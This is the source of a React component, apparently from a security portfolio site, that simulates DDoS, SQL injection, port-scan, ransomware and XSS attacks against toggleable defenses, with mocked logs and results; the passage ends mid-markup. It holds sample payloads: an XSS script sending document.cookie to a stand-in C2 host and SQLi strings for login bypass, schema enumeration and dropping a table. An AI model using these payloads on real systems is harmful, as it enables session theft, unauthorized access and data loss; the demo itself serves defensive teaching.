import React, { useState, useEffect, useRef } from 'react';
import { Shield, ShieldAlert, ShieldCheck, Play, Square, RefreshCw, Terminal, AlertTriangle, Zap, Server, Lock, Flame, Database, Bug, Activity, Radio } from 'lucide-react';
import { AttackSimulationLog } from '../types';

export const AttackSimulator: React.FC = () => {
  const [activeScenario, setActiveScenario] = useState<'ddos' | 'sqli' | 'portscan' | 'ransomware' | 'xss'>('ddos');
  const [isRunning, setIsRunning] = useState(false);
  const [logs, setLogs] = useState<AttackSimulationLog[]>([]);
  
  // DDoS Parameters
  const [packetRate, setPacketRate] = useState<number>(120); // in thousands/sec
  const [ebpfFirewallEnabled, setEbpfFirewallEnabled] = useState(true);
  const [synCookiesEnabled, setSynCookiesEnabled] = useState(true);
  const [serverCpu, setServerCpu] = useState(18);
  const [droppedPercent, setDroppedPercent] = useState(99.4);

  // SQLi Parameters
  const [sqlPayload, setSqlPayload] = useState("' OR '1'='1' -- admin bypass");
  const [wafProtection, setWafProtection] = useState(true);
  const [sqlResult, setSqlResult] = useState<any>(null);

  // Port Scan Parameters
  const [scanTarget, setScanTarget] = useState('192.168.1.105');
  const [scanProgress, setScanProgress] = useState(0);
  const [discoveredPorts, setDiscoveredPorts] = useState<Array<{ port: number; service: string; status: string; cve?: string }>>([]);

  // Ransomware Parameters
  const [entropyRate, setEntropyRate] = useState(0.15);
  const [canaryTripped, setCanaryTripped] = useState(false);
  const [isolatedProcess, setIsolatedProcess] = useState<string | null>(null);

  // XSS Parameters
  const [xssPayload, setXssPayload] = useState("<script>fetch('https://c2.attacker/steal?c=' + document.cookie)</script>");
  const [cspEnabled, setCspEnabled] = useState(true);
  const [xssExecutionResult, setXssExecutionResult] = useState<string | null>(null);

  const logContainerRef = useRef<HTMLDivElement>(null);

  // Auto scroll logs
  useEffect(() => {
    if (logContainerRef.current) {
      logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [logs]);

  // DDoS Simulation loop
  useEffect(() => {
    let interval: any;
    if (isRunning && activeScenario === 'ddos') {
      interval = setInterval(() => {
        const attackIps = [
          '185.220.101.5', '194.26.29.112', '45.154.255.88', '103.149.28.14',
          '89.248.163.9', '198.51.100.42', '203.0.113.19', '185.196.220.31'
        ];
        const randomIp = attackIps[Math.floor(Math.random() * attackIps.length)];
        const packetBatch = (packetRate * 1000) + Math.floor(Math.random() * 5000);
        
        if (ebpfFirewallEnabled) {
          setServerCpu(Math.min(38, Math.floor(15 + (packetRate * 0.08))));
          setDroppedPercent(99.6);
          const newLog: AttackSimulationLog = {
            timestamp: new Date().toISOString().substring(11, 23),
            level: 'BLOCKED',
            sourceIp: randomIp,
            target: 'PORT 443 / TCP SYN FLOOD',
            payload: `SYN Volumetric (${packetBatch.toLocaleString()} pps)`,
            mitigation: 'eBPF XDP Drop at Kernel Ingress (0.002ms)',
          };
          setLogs((prev) => [...prev.slice(-30), newLog]);
        } else {
          setServerCpu(Math.min(99, Math.floor(45 + (packetRate * 0.35))));
          setDroppedPercent(12.4);
          const newLog: AttackSimulationLog = {
            timestamp: new Date().toISOString().substring(11, 23),
            level: 'CRITICAL',
            sourceIp: randomIp,
            target: 'PORT 443 / TCP BACKLOG EXHAUSTION',
            payload: `SYN Flood (${packetBatch.toLocaleString()} pps)`,
            mitigation: 'UNPROTECTED! Connection Pool Saturated',
          };
          setLogs((prev) => [...prev.slice(-30), newLog]);
        }
      }, 700);
    }
    return () => clearInterval(interval);
  }, [isRunning, activeScenario, packetRate, ebpfFirewallEnabled]);

  const handleStartSimulation = () => {
    setIsRunning(true);
    setLogs((prev) => [
      ...prev,
      {
        timestamp: new Date().toISOString().substring(11, 23),
        level: 'INFO',
        sourceIp: '127.0.0.1',
        target: `ATTACK SIMULATOR [${activeScenario.toUpperCase()}]`,
        payload: 'Simulation engine initialized.',
        mitigation: 'Telemetry probes active.',
      },
    ]);

    if (activeScenario === 'portscan') {
      runPortScanSimulation();
    } else if (activeScenario === 'ransomware') {
      runRansomwareSimulation();
    }
  };

  const handleStopSimulation = () => {
    setIsRunning(false);
    setLogs((prev) => [
      ...prev,
      {
        timestamp: new Date().toISOString().substring(11, 23),
        level: 'INFO',
        sourceIp: '127.0.0.1',
        target: 'ATTACK SIMULATOR',
        payload: 'Simulation halted by operator.',
        mitigation: 'Sensors standing by.',
      },
    ]);
  };

  const handleClearLogs = () => {
    setLogs([]);
  };

  // Run SQLi test
  const handleExecuteSqlTest = () => {
    const timestamp = new Date().toISOString().substring(11, 23);
    if (wafProtection) {
      setSqlResult({
        status: 'BLOCKED',
        code: 403,
        threatScore: '98/100 (CRITICAL SQLi)',
        parsedAst: 'Boolean OR Tautology Detected: ("1"="1")',
        mitigation: 'Input intercepted by AST Sanitizer before reaching database query planner.',
      });
      setLogs((prev) => [
        ...prev,
        {
          timestamp,
          level: 'BLOCKED',
          sourceIp: '198.51.100.87',
          target: '/api/v1/auth/login',
          payload: `SQLi: ${sqlPayload}`,
          mitigation: 'AST Query Firewall: Blocked (403 Forbidden)',
        },
      ]);
    } else {
      setSqlResult({
        status: 'EXPLOITED',
        code: 200,
        threatScore: 'CRITICAL COMPROMISE',
        extractedData: [
          { id: 1, username: 'admin', role: 'superadmin', password_hash: '$2b$12$eK8...REDACTED' },
          { id: 2, username: 'sulaiman', role: 'security_auditor', password_hash: '$2b$12$m7Q...REDACTED' },
        ],
        mitigation: 'VULNERABILITY DETECTED! Unparameterized string interpolation permitted full DB dump.',
      });
      setLogs((prev) => [
        ...prev,
        {
          timestamp,
          level: 'CRITICAL',
          sourceIp: '198.51.100.87',
          target: '/api/v1/auth/login',
          payload: `SQLi: ${sqlPayload}`,
          mitigation: 'NONE! Database Authentication Bypass Succeeded',
        },
      ]);
    }
  };

  // Run Port Scan
  const runPortScanSimulation = () => {
    setScanProgress(0);
    setDiscoveredPorts([]);
    const portsToFind = [
      { port: 22, service: 'SSH (OpenSSH 8.9p1)', status: 'OPEN', cve: 'Hardened (Public Key Only)' },
      { port: 80, service: 'HTTP (nginx 1.24)', status: 'REDIRECT', cve: 'Enforcing 301 to HTTPS' },
      { port: 443, service: 'HTTPS (TLS 1.3)', status: 'OPEN', cve: 'Zero Weak Ciphers' },
      { port: 3306, service: 'MySQL 8.0.35', status: 'FILTERED', cve: 'eBPF IP-Whitelisted' },
      { port: 5432, service: 'PostgreSQL 16', status: 'FILTERED', cve: 'Internal Subnet Only' },
      { port: 8080, service: 'Kafka Stream Admin', status: 'OPEN', cve: 'mTLS Protected' },
    ];

    let current = 0;
    const interval = setInterval(() => {
      current += 20;
      setScanProgress(current);
      if (current >= 100) {
        clearInterval(interval);
        setDiscoveredPorts(portsToFind);
        setLogs((prev) => [
          ...prev,
          {
            timestamp: new Date().toISOString().substring(11, 23),
            level: 'INFO',
            sourceIp: '192.168.1.50 (Nmap Scanner)',
            target: `${scanTarget} (TCP SYN Stealth)`,
            payload: 'Scan completed: 6 ports probed across target subnet',
            mitigation: 'Host fingerprint obfuscated by Red Team kernel module',
          },
        ]);
        setIsRunning(false);
      }
    }, 400);
  };

  // Run Ransomware simulation
  const runRansomwareSimulation = () => {
    setCanaryTripped(false);
    setIsolatedProcess(null);
    setEntropyRate(0.2);

    setTimeout(() => {
      setEntropyRate(0.89);
      setCanaryTripped(true);
      setIsolatedProcess('PID: 49102 (suspicious_encrypter.bin)');
      setLogs((prev) => [
        ...prev,
        {
          timestamp: new Date().toISOString().substring(11, 23),
          level: 'CRITICAL',
          sourceIp: 'LOCAL HOST PROCESS',
          target: '/var/data/canary/.vault_token',
          payload: 'High Shannon Entropy (>7.92) file modification detected',
          mitigation: 'Canary tripped! Automated kill -9 & memory snapshot dumped',
        },
        {
          timestamp: new Date().toISOString().substring(11, 23),
          level: 'BLOCKED',
          sourceIp: 'KRYPTON DFIR SENSOR',
          target: 'PID 49102',
          payload: 'Process isolated. Network namespace severed.',
          mitigation: 'Immutable snapshot rolled back. 0 files compromised.',
        },
      ]);
      setIsRunning(false);
    }, 1400);
  };

  // Run XSS test
  const handleExecuteXssTest = () => {
    const timestamp = new Date().toISOString().substring(11, 23);
    if (cspEnabled) {
      setXssExecutionResult('BLOCKED by Content Security Policy (script-src "self" nonce enforced). Document cookies preserved.');
      setLogs((prev) => [
        ...prev,
        {
          timestamp,
          level: 'BLOCKED',
          sourceIp: '192.0.2.14',
          target: 'DOM Element #comment-body',
          payload: xssPayload,
          mitigation: 'CSP Violation Report: Refused to execute inline script.',
        },
      ]);
    } else {
      setXssExecutionResult('EXPLOITED: Inline script executed inside victim DOM context. Session token exfiltrated to C2 server.');
      setLogs((prev) => [
        ...prev,
        {
          timestamp,
          level: 'CRITICAL',
          sourceIp: '192.0.2.14',
          target: 'DOM Element #comment-body',
          payload: xssPayload,
          mitigation: 'NO CSP FOUND: Document cookies exfiltrated.',
        },
      ]);
    }
  };

  return (
    <section id="simulator" className="py-16 md:py-24 bg-white dark:bg-[#030712] relative border-t border-b border-slate-200 dark:border-cyan-500/20 transition-colors duration-200">
      
      {/* Background ambient lighting */}
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_60%_50%_at_50%_0%,rgba(14,165,233,0.08),transparent_80%)] dark:bg-[radial-gradient(ellipse_60%_50%_at_50%_0%,rgba(6,182,212,0.12),transparent_80%)] pointer-events-none" />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* Section Header */}
        <div className="text-center space-y-3 max-w-3xl mx-auto mb-10">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-50 dark:bg-cyan-950/80 border border-blue-200 dark:border-cyan-500/40 text-blue-700 dark:text-cyan-300 text-xs font-mono font-semibold">
            <Radio className="w-3.5 h-3.5 text-blue-600 dark:text-cyan-400 animate-pulse" />
            <span>INTERACTIVE THREAT LAB</span>
          </div>
          <h2 className="text-2xl sm:text-4xl font-bold tracking-tight text-slate-900 dark:text-white">
            Real-Time Cyber Attack & Defense Simulations
          </h2>
          <p className="text-sm sm:text-base text-slate-600 dark:text-slate-300 font-sans">
            Experience live red team attack vectors, packet flooding, query injection, and kernel-level eBPF defense mitigations built and tested by Sulaiman Balikoowa.
          </p>
        </div>

        {/* Simulation Scenario Tabs */}
        <div className="flex flex-wrap items-center justify-center gap-2 mb-8">
          {[
            { id: 'ddos', label: 'DDoS & SYN Flood', icon: Flame, badge: 'eBPF / XDP' },
            { id: 'sqli', label: 'SQL Injection Sandbox', icon: Database, badge: 'AST Sanitizer' },
            { id: 'portscan', label: 'Port Recon & Nmap', icon: Server, badge: 'Stealth Scan' },
            { id: 'ransomware', label: 'Ransomware Canary', icon: Lock, badge: 'Entropy Trap' },
            { id: 'xss', label: 'XSS & CSP Shield', icon: Bug, badge: 'L7 Defense' },
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeScenario === tab.id;
            return (
              <button
                key={tab.id}
                id={`sim-tab-${tab.id}`}
                onClick={() => {
                  setActiveScenario(tab.id as any);
                  setIsRunning(false);
                }}
                className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-mono text-xs sm:text-sm font-medium transition-all ${
                  isActive
                    ? 'bg-blue-600 text-white dark:bg-cyan-500/20 dark:text-cyan-300 dark:border dark:border-cyan-400 shadow-sm dark:shadow-[0_0_15px_rgba(6,182,212,0.35)]'
                    : 'bg-slate-100 dark:bg-slate-900/80 text-slate-700 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-200 border border-slate-200 dark:border-slate-800 hover:bg-slate-200/70 dark:hover:bg-slate-800'
                }`}
              >
                <Icon className={`w-4 h-4 ${isActive ? 'text-white dark:text-cyan-400' : 'text-slate-500 dark:text-slate-400'}`} />
                <span>{tab.label}</span>
                <span className={`text-[10px] px-1.5 py-0.2 rounded font-mono ${
                  isActive ? 'bg-blue-700 text-white dark:bg-cyan-950 dark:text-cyan-200 dark:border dark:border-cyan-500/50' : 'bg-slate-200 dark:bg-black/50 text-slate-600 dark:text-slate-400'
                }`}>
                  {tab.badge}
                </span>
              </button>
            );
          })}
        </div>

        {/* Interactive Lab Workspace Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          
          {/* Left Column: Interactive Controls & Configuration */}
          <div className="lg:col-span-7 space-y-6">
            
            <div className="p-6 rounded-2xl bg-white dark:bg-[#060e1d] border border-slate-200 dark:border-cyan-500/30 shadow-md dark:shadow-xl">
              
              {/* Scenario 1: DDoS & SYN Flood */}
              {activeScenario === 'ddos' && (
                <div className="space-y-6">
                  <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                    <div>
                      <h3 className="font-mono text-lg font-bold text-white flex items-center gap-2">
                        <Flame className="w-5 h-5 text-amber-400" />
                        DDoS & SYN Flood Attack Mitigation
                      </h3>
                      <p className="text-xs text-slate-400 mt-0.5">
                        Simulate volumetric Layer 4 flood mitigated at Linux kernel level via eBPF XDP hooks.
                      </p>
                    </div>
                    <div className="flex items-center gap-2">
                      {!isRunning ? (
                        <button
                          id="ddos-start-sim-btn"
                          onClick={handleStartSimulation}
                          className="flex items-center gap-1.5 px-4 py-2 rounded-lg bg-rose-600 hover:bg-rose-500 text-white font-mono text-xs font-semibold shadow-[0_0_15px_rgba(244,63,94,0.4)] transition-all"
                        >
                          <Play className="w-3.5 h-3.5 fill-current" />
                          <span>Inject Flood</span>
                        </button>
                      ) : (
                        <button
                          id="ddos-stop-sim-btn"
                          onClick={handleStopSimulation}
                          className="flex items-center gap-1.5 px-4 py-2 rounded-lg bg-amber-600 hover:bg-amber-500 text-white font-mono text-xs font-semibold shadow-[0_0_15px_rgba(245,158,11,0.4)] transition-all"
                        >
                          <Square className="w-3.5 h-3.5 fill-current" />
                          <span>Halt Attack</span>
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Packet Rate Slider */}
                  <div className="space-y-2">
                    <div className="flex justify-between items-center text-xs font-mono">
                      <span className="text-slate-300">Volumetric Packet Pressure:</span>
                      <span className="text-cyan-400 font-bold">{(packetRate * 1000).toLocaleString()} packets / sec</span>
                    </div>
                    <input
                      type="range"
                      min="20"
                      max="500"
                      step="20"
                      value={packetRate}
                      onChange={(e) => setPacketRate(Number(e.target.value))}
                      className="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-cyan-400"
                    />
                    <div className="flex justify-between text-[10px] font-mono text-slate-400">
                      <span>20k pps (Light Probe)</span>
                      <span>250k pps (Standard Botnet)</span>
                      <span>500k pps (Massive SYN Wave)</span>
                    </div>
                  </div>

                  {/* Defense Toggles */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-2">
                    <div
                      onClick={() => setEbpfFirewallEnabled(!ebpfFirewallEnabled)}
                      className={`p-3 rounded-xl border cursor-pointer transition-all flex items-start gap-3 ${
                        ebpfFirewallEnabled
                          ? 'bg-cyan-950/40 border-cyan-500/60 text-cyan-300'
                          : 'bg-slate-900/60 border-slate-800 text-slate-400'
                      }`}
                    >
                      <div className={`p-1.5 rounded-lg ${ebpfFirewallEnabled ? 'bg-cyan-500/20 text-cyan-400' : 'bg-slate-800 text-slate-400'}`}>
                        <ShieldCheck className="w-5 h-5" />
                      </div>
                      <div>
                        <div className="font-mono text-xs font-bold">eBPF XDP Layer 7 Drop</div>
                        <div className="text-[11px] text-slate-400">Drops invalid SYNs in driver ring buffer before CPU interrupt</div>
                      </div>
                    </div>

                    <div
                      onClick={() => setSynCookiesEnabled(!synCookiesEnabled)}
                      className={`p-3 rounded-xl border cursor-pointer transition-all flex items-start gap-3 ${
                        synCookiesEnabled
                          ? 'bg-emerald-950/40 border-emerald-500/60 text-emerald-300'
                          : 'bg-slate-900/60 border-slate-800 text-slate-400'
                      }`}
                    >
                      <div className={`p-1.5 rounded-lg ${synCookiesEnabled ? 'bg-emerald-500/20 text-emerald-400' : 'bg-slate-800 text-slate-400'}`}>
                        <Zap className="w-5 h-5" />
                      </div>
                      <div>
                        <div className="font-mono text-xs font-bold">TCP SYN Cookies</div>
                        <div className="text-[11px] text-slate-400">Cryptographic state encoding prevents memory table exhaustion</div>
                      </div>
                    </div>
                  </div>

                  {/* Live Telemetry Gauges */}
                  <div className="grid grid-cols-3 gap-3 p-4 rounded-xl bg-black/60 border border-slate-800 font-mono">
                    <div className="text-center">
                      <div className="text-[10px] text-slate-400 uppercase">Server CPU Load</div>
                      <div className={`text-xl font-bold mt-1 ${serverCpu > 80 ? 'text-rose-400 animate-pulse' : serverCpu > 40 ? 'text-amber-400' : 'text-emerald-400'}`}>
                        {serverCpu}%
                      </div>
                      <div className="text-[10px] text-slate-400">{serverCpu > 80 ? 'UNSTABLE' : 'OPTIMAL'}</div>
                    </div>

                    <div className="text-center border-x border-slate-800">
                      <div className="text-[10px] text-slate-400 uppercase">Mitigation Rate</div>
                      <div className="text-xl font-bold text-cyan-400 mt-1">
                        {droppedPercent}%
                      </div>
                      <div className="text-[10px] text-slate-400">Packets Filtered</div>
                    </div>

                    <div className="text-center">
                      <div className="text-[10px] text-slate-400 uppercase">Response SLA</div>
                      <div className="text-xl font-bold text-emerald-400 mt-1">
                        {ebpfFirewallEnabled ? '0.8 ms' : '820 ms'}
                      </div>
                      <div className="text-[10px] text-slate-400">End-User Latency</div>
                    </div>
                  </div>

                </div>
              )}

              {/* Scenario 2: SQL Injection Sandbox */}
              {activeScenario === 'sqli' && (
                <div className="space-y-5">
                  <div className="pb-3 border-b border-slate-800">
                    <h3 className="font-mono text-lg font-bold text-white flex items-center gap-2">
                      <Database className="w-5 h-5 text-cyan-400" />
                      SQL Injection (SQLi) & AST Query Hardening
                    </h3>
                    <p className="text-xs text-slate-400 mt-0.5">
                      Inject payloads against a simulated authentication query and test AST-based parser isolation.
                    </p>
                  </div>

                  {/* Preset Payloads */}
                  <div className="space-y-2">
                    <label className="text-xs font-mono text-slate-300">Quick Exploit Payloads:</label>
                    <div className="flex flex-wrap gap-2">
                      {[
                        "' OR '1'='1' -- admin",
                        "admin' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
                        "1; DROP TABLE audit_logs; --",
                        "' OR 1=1 ORDER BY 4 --",
                      ].map((payload) => (
                        <button
                          key={payload}
                          onClick={() => setSqlPayload(payload)}
                          className="px-2.5 py-1 rounded bg-slate-900 hover:bg-slate-800 border border-slate-700 text-[11px] font-mono text-cyan-300 truncate max-w-xs"
                        >
                          {payload}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Payload Input */}
                  <div className="space-y-1.5">
                    <label className="text-xs font-mono text-slate-300">Input Payload String:</label>
                    <input
                      type="text"
                      value={sqlPayload}
                      onChange={(e) => setSqlPayload(e.target.value)}
                      className="w-full px-3.5 py-2.5 bg-black/70 border border-cyan-500/40 rounded-lg text-xs font-mono text-emerald-300 focus:outline-none focus:border-cyan-400"
                    />
                  </div>

                  {/* WAF Toggle */}
                  <div className="flex items-center justify-between p-3 rounded-xl bg-slate-900/70 border border-slate-800">
                    <div className="flex items-center gap-3">
                      <ShieldCheck className={`w-5 h-5 ${wafProtection ? 'text-emerald-400' : 'text-slate-400'}`} />
                      <div>
                        <div className="font-mono text-xs font-bold text-white">AST Query Sanitizer & L7 WAF</div>
                        <div className="text-[11px] text-slate-400">Deconstructs statement into Abstract Syntax Tree to block token mutations</div>
                      </div>
                    </div>
                    <button
                      onClick={() => setWafProtection(!wafProtection)}
                      className={`px-3 py-1.5 rounded-lg font-mono text-xs font-bold transition-all ${
                        wafProtection
                          ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50'
                          : 'bg-rose-500/20 text-rose-300 border border-rose-500/50'
                      }`}
                    >
                      {wafProtection ? 'ENABLED' : 'DISABLED'}
                    </button>
                  </div>

                  <button
                    id="execute-sqli-test-btn"
                    onClick={handleExecuteSqlTest}
                    className="w-full py-2.5 rounded-lg bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-mono text-xs font-bold shadow-lg"
                  >
                    Execute Query Test & Observe Database Execution
                  </button>

                  {/* Result Box */}
                  {sqlResult && (
                    <div className={`p-4 rounded-xl border font-mono text-xs space-y-2 ${
                      sqlResult.status === 'BLOCKED'
                        ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-300'
                        : 'bg-rose-950/40 border-rose-500/60 text-rose-300'
                    }`}>
                      <div className="flex items-center justify-between font-bold">
                        <span>STATUS: {sqlResult.status} ({sqlResult.code})</span>
                        <span>{sqlResult.threatScore}</span>
                      </div>
                      <div className="text-slate-300 text-[11px]">{sqlResult.mitigation}</div>
                      {sqlResult.extractedData && (
                        <div className="p-2 bg-black/60 rounded border border-rose-500/30 text-[11px]">
                          <div className="text-rose-400 font-bold">DUMPED DATA RECORDS:</div>
                          <pre className="text-slate-300 overflow-x-auto">{JSON.stringify(sqlResult.extractedData, null, 2)}</pre>
                        </div>
                      )}
                    </div>
                  )}

                </div>
              )}

              {/* Scenario 3: Port Reconnaissance */}
              {activeScenario === 'portscan' && (
                <div className="space-y-5">
                  <div className="pb-3 border-b border-slate-800 flex justify-between items-center">
                    <div>
                      <h3 className="font-mono text-lg font-bold text-white flex items-center gap-2">
                        <Server className="w-5 h-5 text-emerald-400" />
                        Network Port Scanner & Fingerprinting
                      </h3>
                      <p className="text-xs text-slate-400 mt-0.5">
                        Simulate an automated Nmap TCP SYN reconnaissance sweep against production subnets.
                      </p>
                    </div>
                    <button
                      id="launch-portscan-btn"
                      onClick={runPortScanSimulation}
                      disabled={isRunning}
                      className="px-4 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-mono text-xs font-bold transition-all disabled:opacity-50"
                    >
                      {isRunning ? 'Scanning...' : 'Run Scan'}
                    </button>
                  </div>

                  <div className="flex items-center gap-3">
                    <span className="text-xs font-mono text-slate-300">Target Host / Subnet:</span>
                    <input
                      type="text"
                      value={scanTarget}
                      onChange={(e) => setScanTarget(e.target.value)}
                      className="px-3 py-1.5 bg-black/60 border border-slate-700 rounded text-xs font-mono text-cyan-300"
                    />
                  </div>

                  {/* Progress bar */}
                  {isRunning && (
                    <div className="space-y-1.5 font-mono text-xs">
                      <div className="flex justify-between text-slate-300">
                        <span>SYN Stealth Scan in progress...</span>
                        <span className="text-cyan-400 font-bold">{scanProgress}%</span>
                      </div>
                      <div className="w-full bg-slate-800 rounded-full h-2 overflow-hidden">
                        <div
                          className="bg-cyan-400 h-full transition-all duration-300"
                          style={{ width: `${scanProgress}%` }}
                        />
                      </div>
                    </div>
                  )}

                  {/* Discovered Ports Table */}
                  <div className="border border-slate-800 rounded-xl overflow-hidden font-mono text-xs">
                    <div className="grid grid-cols-12 bg-slate-900/90 p-2.5 text-slate-400 font-semibold border-b border-slate-800">
                      <div className="col-span-2">PORT</div>
                      <div className="col-span-4">SERVICE / BANNER</div>
                      <div className="col-span-3">STATE</div>
                      <div className="col-span-3">SECURITY POSTURE</div>
                    </div>
                    <div className="divide-y divide-slate-800/60 bg-black/40">
                      {discoveredPorts.length > 0 ? (
                        discoveredPorts.map((item) => (
                          <div key={item.port} className="grid grid-cols-12 p-2.5 text-slate-300 hover:bg-slate-900/50">
                            <div className="col-span-2 text-cyan-300 font-bold">{item.port}/tcp</div>
                            <div className="col-span-4 text-slate-300">{item.service}</div>
                            <div className="col-span-3">
                              <span className={`px-1.5 py-0.5 rounded text-[10px] ${
                                item.status === 'OPEN' ? 'bg-emerald-950 text-emerald-300 border border-emerald-500/40' : 'bg-slate-800 text-slate-300'
                              }`}>
                                {item.status}
                              </span>
                            </div>
                            <div className="col-span-3 text-[11px] text-slate-400">{item.cve}</div>
                          </div>
                        ))
                      ) : (
                        <div className="p-6 text-center text-slate-400">
                          Click "Run Scan" to initiate target discovery sweep.
                        </div>
                      )}
                    </div>
                  </div>

                </div>
              )}

              {/* Scenario 4: Ransomware Canary */}
              {activeScenario === 'ransomware' && (
                <div className="space-y-5">
                  <div className="pb-3 border-b border-slate-800 flex justify-between items-center">
                    <div>
                      <h3 className="font-mono text-lg font-bold text-white flex items-center gap-2">
                        <Lock className="w-5 h-5 text-rose-400" />
                        Ransomware Canary & Memory Decryption Trap
                      </h3>
                      <p className="text-xs text-slate-400 mt-0.5">
                        Detect high-entropy encryption in honeypot canary directories and execute instant process isolation.
                      </p>
                    </div>
                    <button
                      id="launch-ransomware-trap-btn"
                      onClick={runRansomwareSimulation}
                      className="px-4 py-2 rounded-lg bg-rose-600 hover:bg-rose-500 text-white font-mono text-xs font-bold"
                    >
                      Trigger Test Encrypter
                    </button>
                  </div>

                  <div className="p-4 rounded-xl bg-black/60 border border-slate-800 space-y-3 font-mono text-xs">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-300">Shannon Entropy Level:</span>
                      <span className={`font-bold ${entropyRate > 0.7 ? 'text-rose-400' : 'text-emerald-400'}`}>
                        {(entropyRate * 8).toFixed(2)} / 8.00 bits (High = Encrypted)
                      </span>
                    </div>
                    <div className="w-full bg-slate-800 rounded-full h-2 overflow-hidden">
                      <div
                        className={`h-full transition-all duration-500 ${
                          entropyRate > 0.7 ? 'bg-rose-500' : 'bg-emerald-400'
                        }`}
                        style={{ width: `${entropyRate * 100}%` }}
                      />
                    </div>
                  </div>

                  {canaryTripped && (
                    <div className="p-4 rounded-xl bg-rose-950/40 border border-rose-500/60 font-mono text-xs space-y-2">
                      <div className="flex items-center gap-2 text-rose-400 font-bold">
                        <AlertTriangle className="w-4 h-4" />
                        <span>CANARY TRIPPED! OFFENSIVE BEHAVIOR DETECTED</span>
                      </div>
                      <p className="text-slate-300 text-[11px]">
                        Target: <code className="text-rose-300">/var/data/canary/.vault_token</code> modified with high entropy payload.
                      </p>
                      <div className="p-2.5 bg-black/80 rounded border border-rose-500/30 text-emerald-300 text-[11px]">
                        <strong>Automated Incident Response Action:</strong>
                        <ul className="list-disc list-inside mt-1 space-y-0.5 text-slate-300">
                          <li>SIGKILL sent to {isolatedProcess}</li>
                          <li>Linux Netfilter host namespace severed</li>
                          <li>Memory dump extracted for KryptonDFIR timeline reconstruction</li>
                          <li>Btrfs filesystem snapshot rolled back (0 byte loss)</li>
                        </ul>
                      </div>
                    </div>
                  )}

                </div>
              )}

              {/* Scenario 5: XSS & CSP */}
              {activeScenario === 'xss' && (
                <div className="space-y-5">
                  <div className="pb-3 border-b border-slate-800">
                    <h3 className="font-mono text-lg font-bold text-white flex items-center gap-2">
                      <Bug className="w-5 h-5 text-violet-400" />
                      Cross-Site Scripting (XSS) & CSP Defense
                    </h3>
                    <p className="text-xs text-slate-400 mt-0.5">
                      Test DOM / Reflected XSS injection against strict Content-Security-Policy rules.
                    </p>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-mono text-slate-300">Injected Script Payload:</label>
                    <textarea
                      rows={2}
                      value={xssPayload}
                      onChange={(e) => setXssPayload(e.target.value)}
                      className="w-full px-3 py-2 bg-black/70 border border-violet-500/40 rounded-lg text-xs font-mono text-violet-300 focus:outline-none"
                    />
                  </div>

                  <div className="flex items-center justify-between p-3 rounded-xl bg-slate-900/70 border border-slate-800">
                    <div>
                      <div className="font-mono text-xs font-bold text-white">Strict Content-Security-Policy (CSP)</div>
                      <div className="text-[11px] text-slate-400">script-src 'self' 'nonce-...' forbids unsafe inline execution</div>
                    </div>
                    <button
                      onClick={() => setCspEnabled(!cspEnabled)}
                      className={`px-3 py-1.5 rounded-lg font-mono text-xs font-bold ${
                        cspEnabled ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50' : 'bg-rose-500/20 text-rose-300 border border-rose-500/50'
                      }`}
                    >
                      {cspEnabled ? 'ENFORCED' : 'DISABLED'}
                    </button>
                  </div>

                  <button
                    id="execute-xss-test-btn"
                    onClick={handleExecuteXssTest}
                    className="w-full py-2.5 rounded-lg bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 hover:to-indigo-500 text-white font-mono text-xs font-bold"
                  >
                    Simulate Client DOM Render
                  </button>

                  {xssExecutionResult && (
                    <div className={`p-4 rounded-xl border font-mono text-xs ${
                      cspEnabled ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-300' : 'bg-rose-950/40 border-rose-500/60 text-rose-300'
                    }`}>
                      <div className="font-bold">OUTCOME: {cspEnabled ? 'ATTACK BLOCKED' : 'PAYLOAD EXECUTED'}</div>
                      <div className="mt-1 text-slate-300 text-[11px]">{xssExecutionResult}</div>
                    </div>
                  )}

                </div>
              )}

            </div>

          </div>

          {/* Right Column: Live SIEM Telemetry Log Stream */}
          <div className="lg:col-span-5 flex flex-col">
            <div className="p-4 rounded-2xl bg-[#040914] border border-cyan-500/30 flex-1 flex flex-col shadow-xl">
              
              {/* Header */}
              <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                <div className="flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  <span className="font-mono text-xs font-bold text-white uppercase tracking-wider">
                    SIEM Telemetry & Sensor Logs
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  <button
                    onClick={handleClearLogs}
                    className="text-[11px] font-mono text-slate-400 hover:text-white transition-colors"
                  >
                    Clear
                  </button>
                </div>
              </div>

              {/* Log Stream Box */}
              <div
                ref={logContainerRef}
                className="mt-3 flex-1 max-h-[380px] min-h-[300px] overflow-y-auto font-mono text-[11px] space-y-2 pr-1 select-text scrollbar-thin scrollbar-thumb-slate-800"
              >
                {logs.length === 0 ? (
                  <div className="h-full flex flex-col items-center justify-center text-slate-400 text-center p-6 space-y-2">
                    <Activity className="w-6 h-6 text-slate-400" />
                    <span>Awaiting simulation activity. Select a scenario on the left and start the attack test.</span>
                  </div>
                ) : (
                  logs.map((log, idx) => (
                    <div
                      key={idx}
                      className={`p-2 rounded border transition-all ${
                        log.level === 'BLOCKED'
